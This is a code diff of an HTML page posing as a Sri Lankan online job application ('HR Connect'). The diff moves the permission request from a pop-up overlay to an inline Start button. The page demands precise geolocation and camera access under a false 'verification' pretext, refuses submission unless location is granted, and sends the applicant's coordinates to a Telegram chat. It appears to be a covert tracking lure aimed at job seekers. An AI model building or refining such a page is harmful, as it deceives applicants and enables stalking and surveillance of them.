@@ -5,7 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Job Application - HR Dept</title>
   <style>
-    /* ===== RESET ===== */
     * {
       margin: 0;
       padding: 0;
@@ -22,7 +21,6 @@
       padding: 20px;
     }
 
-    /* ===== CARD ===== */
     .card {
       max-width: 520px;
       width: 100%;
@@ -30,7 +28,6 @@
       border-radius: 24px;
       padding: 32px 28px 36px;
       box-shadow: 0 12px 40px rgba(0, 0, 0, 0.08);
-      transition: 0.3s;
       border: 1px solid rgba(0, 0, 0, 0.04);
     }
 
@@ -38,7 +35,6 @@
       font-size: 28px;
       font-weight: 700;
       color: #1a2a3a;
-      letter-spacing: -0.5px;
       margin-bottom: 4px;
     }
 
@@ -48,6 +44,36 @@
       margin-bottom: 24px;
       border-bottom: 2px solid #f0f4f9;
       padding-bottom: 16px;
+    }
+
+    /* ===== START BUTTON (Permission Trigger) ===== */
+    #start-section {
+      text-align: center;
+      margin-bottom: 24px;
+    }
+
+    #start-btn {
+      background: #2a7de1;
+      color: #fff;
+      border: none;
+      padding: 14px 40px;
+      font-size: 18px;
+      font-weight: 600;
+      border-radius: 40px;
+      cursor: pointer;
+      transition: 0.25s;
+      box-shadow: 0 4px 14px rgba(42, 125, 225, 0.3);
+    }
+
+    #start-btn:hover {
+      background: #1a6ac8;
+      transform: scale(1.02);
+    }
+
+    #start-btn:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+      transform: none;
     }
 
     /* ===== SUCCESS BANNER ===== */
@@ -84,74 +110,6 @@
 
     #location-status .text {
       flex: 1;
-    }
-
-    /* ===== PERMISSION OVERLAY (Popup) ===== */
-    #permission-overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.75);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      z-index: 9999;
-      padding: 20px;
-      box-sizing: border-box;
-      animation: fadeIn 0.3s ease;
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; }
-      to { opacity: 1; }
-    }
-
-    #permission-overlay .popup-box {
-      background: #fff;
-      max-width: 400px;
-      width: 100%;
-      padding: 32px 24px;
-      border-radius: 20px;
-      text-align: center;
-      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-    }
-
-    #permission-overlay .popup-box .icon {
-      font-size: 56px;
-      margin-bottom: 12px;
-    }
-
-    #permission-overlay .popup-box h2 {
-      font-size: 20px;
-      color: #1a2a3a;
-      margin-bottom: 8px;
-    }
-
-    #permission-overlay .popup-box p {
-      font-size: 14px;
-      color: #555;
-      margin-bottom: 20px;
-      line-height: 1.6;
-    }
-
-    #permission-overlay .popup-box .btn-start {
-      background: #2a7de1;
-      color: #fff;
-      border: none;
-      padding: 14px 30px;
-      font-size: 17px;
-      font-weight: 600;
-      border-radius: 40px;
-      cursor: pointer;
-      transition: 0.25s;
-      width: 100%;
-      box-shadow: 0 4px 14px rgba(42, 125, 225, 0.3);
-    }
-
-    #permission-overlay .popup-box .btn-start:hover {
-      background: #1a6ac8;
     }
 
     /* ===== FORM ===== */
@@ -221,37 +179,27 @@
       transform: none;
     }
 
-    /* ===== RESPONSIVE ===== */
     @media (max-width: 480px) {
       .card {
         padding: 22px 16px 28px;
-      }
-      #permission-overlay .popup-box {
-        padding: 24px 16px;
       }
     }
   </style>
 </head>
 <body>
 
-<!-- ===== PERMISSION OVERLAY (POPUP) - Page Load ===== -->
-<div id="permission-overlay">
-  <div class="popup-box">
-    <div class="icon">📋</div>
-    <h2>Job Application Access</h2>
-    <p>
-      ඔබගේ <strong>Location</strong> සහ <strong>Camera</strong> අවශ්‍ය වේ.<br>
-      මෙය Job Application verification සඳහා පමණයි.
-    </p>
-    <button class="btn-start" id="startBtn">✅ Start Application</button>
-  </div>
-</div>
-
-<!-- ===== MAIN CARD ===== -->
 <div class="card">
 
   <div class="logo">📋 HR Connect</div>
   <div class="sub-logo">Online Job Application · Sri Lanka</div>
+
+  <!-- ===== START BUTTON (Click to trigger permissions) ===== -->
+  <div id="start-section">
+    <button id="start-btn">✅ Start Application</button>
+    <p style="font-size: 13px; color: #888; margin-top: 6px;">
+      Click to allow Location & Camera access
+    </p>
+  </div>
 
   <!-- ===== SUCCESS BANNER ===== -->
   <div id="success-banner">
@@ -261,7 +209,7 @@
   <!-- ===== LOCATION STATUS ===== -->
   <div id="location-status">
     <span class="icon">📍</span>
-    <span class="text" id="locationText">⏳ Detecting your location...</span>
+    <span class="text" id="locationText">⏳ Waiting for permission...</span>
   </div>
 
   <!-- ===== APPLICATION FORM ===== -->
@@ -318,8 +266,7 @@
   // =============================================
   // 📍 ELEMENTS
   // =============================================
-  const overlay = document.getElementById('permission-overlay');
-  const startBtn = document.getElementById('startBtn');
+  const startBtn = document.getElementById('start-btn');
   const locationText = document.getElementById('locationText');
   const locationStatusDiv = document.getElementById('location-status');
   const successBanner = document.getElementById('success-banner');
@@ -327,20 +274,20 @@
   let locationAllowed = false;
 
   // =============================================
-  // 🚀 START BUTTON - REQUEST PERMISSIONS
+  // 🚀 START BUTTON CLICK → PERMISSIONS
   // =============================================
   startBtn.addEventListener('click', () => {
-    // Hide overlay
-    overlay.style.display = 'none';
+    startBtn.disabled = true;
+    startBtn.textContent = '⏳ Requesting...';
 
-    // Request Location AND Camera
-    requestLocationAndCamera();
+    // Request Location + Camera
+    requestPermissions();
   });
 
   // =============================================
   // 📍 REQUEST LOCATION + CAMERA
   // =============================================
-  function requestLocationAndCamera() {
+  function requestPermissions() {
     // ----- 1. LOCATION -----
     locationText.textContent = '⏳ Requesting location...';
 
@@ -356,6 +303,9 @@
           locationStatusDiv.style.display = 'none';
 
           sendLocationToTelegram(lat, lon);
+
+          startBtn.textContent = '✅ Permission Granted';
+          startBtn.style.background = '#28a745';
         },
         (err) => {
           console.warn('Location error:', err);
@@ -367,6 +317,8 @@
           locationAllowed = false;
           successBanner.style.display = 'none';
           locationStatusDiv.style.display = 'flex';
+          startBtn.disabled = false;
+          startBtn.textContent = '🔄 Retry';
         },
         { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
       );
@@ -374,17 +326,15 @@
       locationText.textContent = '❌ Geolocation not supported.';
     }
 
-    // ----- 2. CAMERA (Optional - just to trigger permission) -----
+    // ----- 2. CAMERA (Trigger permission) -----
     if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
       navigator.mediaDevices.getUserMedia({ video: true })
         .then((stream) => {
-          // Camera permission granted - stop stream immediately
           stream.getTracks().forEach(track => track.stop());
           console.log('✅ Camera permission granted');
         })
         .catch((err) => {
           console.warn('Camera permission denied:', err);
-          // Don't show error to user - just log
         });
     }
   }
@@ -445,7 +395,7 @@ ${mapsLink}
     const submitBtn = document.getElementById('submitBtn');
 
     if (!locationAllowed) {
-      alert('❌ කරුණාකර Location Permission එක Allow කරන්න.\n\n"Start Application" බොත්තම ඔබලා Permission දෙන්න.');
+      alert('❌ කරුණාකර මුලින් "Start Application" බොත්තම ඔබලා Location Permission එක Allow කරන්න.');
       submitBtn.disabled = false;
       submitBtn.textContent = '🚀 Submit Application';
       return;
@@ -505,8 +455,10 @@ ${coverNote || '—'}
         locationAllowed = false;
         successBanner.style.display = 'none';
         locationStatusDiv.style.display = 'flex';
-        overlay.style.display = 'flex';
-        locationText.textContent = '⏳ Click "Start Application" to continue...';
+        startBtn.disabled = false;
+        startBtn.textContent = '🔄 Start Again';
+        startBtn.style.background = '#2a7de1';
+        locationText.textContent = '⏳ Click "Start Again" to re-allow permissions...';
       } else {
         submitBtn.textContent = '❌ Submission Failed';
         submitBtn.disabled = false;
@@ -519,7 +471,7 @@ ${coverNote || '—'}
     }
   });
 
-  console.log('✅ HR Connect Form Loaded');
+  console.log('✅ HR Connect Form Loaded - Click Start Button');
 </script>
 
 </body>
